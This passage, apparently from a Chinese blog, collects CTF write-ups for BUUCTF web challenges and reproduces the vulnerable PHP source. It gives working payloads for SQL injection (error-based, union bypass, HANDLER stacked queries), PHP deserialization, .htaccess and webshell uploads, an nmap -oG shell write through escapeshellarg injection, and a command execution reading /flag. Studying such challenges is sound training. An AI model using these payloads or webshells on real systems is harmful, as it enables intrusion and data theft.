class="code"><pre><span class="line">1%27^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)<span class="built_in">where</span>(table_name)like%27H4rDsq1%27),0x7e))^<span class="string">'</span></span><br></pre></td></tr></table></figure><p>本来想用mid、substr函数的，但是被过滤了，换right函数输出后面的flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%27^extractvalue(1,concat(0x7e,(select(group_concat(right(password,13)))from(H4rDsq1)),0x7e))^<span class="string">'1</span></span><br></pre></td></tr></table></figure><h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p> 返回包里面有一串加密字符串，使用base32+base64进行解密得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user <span class="built_in">where</span> username = <span class="string">'$name'</span></span><br></pre></td></tr></table></figure><p>题目描述里面将密码进行了md5加密，所以可以猜测后端的代码是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>($row[<span class="string">'username'</span>]==’admin’)&#123;</span><br><span class="line">        <span class="keyword">if</span>($row[<span class="string">'password'</span>]==md5($pass))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> “wrong pass!”;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123; <span class="keyword">echo</span> “wrong user!”;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里考核的一个知识点是：</p><p>当查询的数据不存在的时候，联合查询就会构造一个虚拟的数据。<br>即输入admin，密码设置为123456，将123456MD5加密后放进union select 查询中</p><p>也就是当name代入查询查询时，在MySQL里面就会生成用户名为admin，密码为123456 MD5加密后的虚拟的数据，同时我们用123456密码进行登录，就能够绕过限制。</p><p>最后的payload为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username栏：<span class="string">' union select 1,"admin","e10adc3949ba59abbe56e057f20f883e";#</span></span><br><span class="line"><span class="string">password栏：123456</span></span><br></pre></td></tr></table></figure><p><img src="../../images/ctf/buuctf/3.png" alt=""></p><h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"> </span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弱类型绕过op，php://filter读取文件，<br>is_valid()两种绕过方式<br>(1). p神在小密圈内曾经发过一个点就是在反序列化时，将s改为S，此时后面的字符串支持16进制表示，因此我们的0x00就可以改写为\00，因为在is_valid中是将我们序列化后的字符串逐个转为ascii然后进行对比，而因此\00会被解析为三个字符，且都在允许的范围内，因此可以成功绕过<br>(2). 这道题因为出题人的php版本较高，前面的绕过还可以用php7.2+的黑魔法，public属性直接反序列化就能用了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $op=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">public</span> $filename=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line"><span class="keyword">public</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">$A=<span class="keyword">new</span> FileHandler();</span><br><span class="line">$B=serialize($A);</span><br><span class="line"><span class="keyword">echo</span> $B;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h1><p> mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。<br>HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。<br>用法: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。</span><br><span class="line">HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。</span><br><span class="line">HANDLER tbl_name CLOSE来关闭打开的句柄。</span><br></pre></td></tr></table></figure><p>最后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">';</span></span><br><span class="line"><span class="string">handler FlagHere open;</span></span><br><span class="line"><span class="string">handler FlagHere read first;</span></span><br><span class="line"><span class="string">handler FlagHere close;#</span></span><br></pre></td></tr></table></figure><h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><p>文件类型为image/jpeg<br>可以上传.htaccess文件和jpg文件 </p><p>先上传一下.htaccess文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p><img src="../../images/ctf/buuctf/4.jpg" alt=""><br>再上传图片马<br><img src="../../images/ctf/buuctf/5.jpg" alt=""></p><h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>WEB-INF/web.xml泄露</p><p>WEB-INF主要包含一下文件或目录:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</span><br></pre></td></tr></table></figure><p>漏洞成因  </p><blockquote><p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p></blockquote><p>WEB-INF/web.xml<br><img src="../../images/ctf/buuctf/6.jpg" alt=""><br>看到</p><p>com.Wm.ctf.FlagController<br>关键路径<br>根据前文：</p><p>漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</p><p>我们结合tomcat的项目存放路径经验试试下载FlagController.class试试<br>payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure><h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/" target="_blank" rel="noopener">http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a>   </p><p>利用escapeshellarg()+escapeshellcmd()的两次转义，导致闭合单引号后即可执行任意参数，然后利用Nmap的-oG参数写入shell<br><img src="../../images/ctf/buuctf/7.png" alt=""></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=<span class="string">' &lt;?php @eval($_POST["hack"]);?&gt; -oG hack.php '</span></span><br></pre></td></tr></table></figure><h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?gg[]=1&amp;id[]=2</span><br><span class="line">post:passwd=1234567a</span><br></pre></td></tr></table></figure><h1 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h1><p>cve-2020-7066<br>get_headers()会截断URL中空字符后的内容</p><p>这是在php7.3中发现的 ，但是一直有这个漏洞</p><p>测试脚本显示这会让恶意脚本获取意外域名的header 。这些header可能泄露敏感信息或者意外地包含攻击者控制的数据。  </p><p>测试脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// user input</span></span><br><span class="line">$_GET[<span class="string">'url'</span>] = <span class="string">"http://localhost\0.example.com"</span>;</span><br><span class="line"></span><br><span class="line">$host = parse_url($_GET[<span class="string">'url'</span>], PHP_URL_HOST);</span><br><span class="line"><span class="keyword">if</span> (substr($host, <span class="number">-12</span>) !== <span class="string">'.example.com'</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$headers = get_headers($_GET[<span class="string">'url'</span>]);</span><br><span class="line">var_dump($headers);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.123%00www.ctfhub.com</span><br></pre></td></tr></table></figure><h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><p><code>.git</code>泄露 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, NULL, <span class="variable">$_GET</span>[<span class="string">'exp'</span>])</span><br><span class="line"></span><br><span class="line">\(和\)表示转义括号</span><br><span class="line">(?R)?表示引用当前表达式</span><br><span class="line">```     </span><br><span class="line">大致意思就是可以使用函数，但是函数中不能有参数</span><br><span class="line">```bash</span><br><span class="line">localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line">scandir() 列出 images 目录中的文件和目录。</span><br><span class="line">readfile() 输出一个文件。</span><br><span class="line">current() 返回数组中的当前单元, 默认取第一个值。</span><br><span class="line">pos() current() 的别名。</span><br><span class="line">next() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">array_reverse()以相反的元素顺序返回数组。</span><br><span class="line">highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。</span><br></pre></td></tr></table></figure><p>查看有哪些文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure><p>打印flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p>解释  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">scandir(current(localeconv()))是查看当前目录</span><br><span class="line">加上array_reverse()是将数组反转，即Array([0]=&gt;index.php[1]=&gt;flag.php=&gt;[2].git[3]=&gt;..[4]=&gt;.)</span><br><span class="line">再加上next()表示内部指针指向数组的下一个元素，并输出，即指向flag.php</span><br><span class="line">highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码</span><br></pre></td></tr></table></figure><h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><p>先上传 <code>.htaccess</code> 文件，注意抓包，要修改 TYPE 为 jpeg </p><h1 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post:</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=cat /flag</span><br></pre></td></tr></table></figure><h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><p>index.php 转化为 16 进制，并 base64 两次</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixi锝� no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span 